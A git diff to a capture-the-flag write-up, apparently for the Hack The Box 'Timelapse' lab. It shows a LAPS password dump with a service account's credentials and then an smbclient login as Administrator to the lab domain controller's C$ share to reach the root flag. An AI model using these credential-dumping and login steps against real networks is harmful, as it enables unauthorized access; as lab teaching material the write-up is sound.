@@ -420,12 +420,27 @@ def main():
 if __name__ == "__main__":
     main()
 [connor@fedora timelapse]$ python laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
-DC01$:[},r9L86NT,/%+gE]).61X-9
+DC01 fN.%-Nxd5,B#${3zf1+&6)06
 ```
 
 <br>
 
-This gives admin creds!
+This gives admin creds! Now there appeared to be an openssh bug currently that didn't let me login with evil-winrm. <br>
+But we can also just use smbclient to get flag. 
 
 <br>
+
+```
+[connor@fedora ~]$ smbclient -U 'Administrator' //10.10.11.152/C$ --password='fN.%-Nxd5,B#${3zf1+&6)06'
+Try "help" to get a list of possible commands.
+smb: \> cd Users\TRX\Desktop\
+smb: \Users\TRX\Desktop\> ls
+  .                                  DR        0  Fri Mar  4 16:45:48 2022
+  ..                                 DR        0  Fri Mar  4 16:45:48 2022
+  desktop.ini                       AHS      282  Fri Mar  4 16:45:48 2022
+  root.txt                           AR       34  Wed Jul  6 22:27:12 2022
+
+                6367231 blocks of size 4096. 2452954 blocks available
+smb: \Users\TRX\Desktop\> 
+```
 
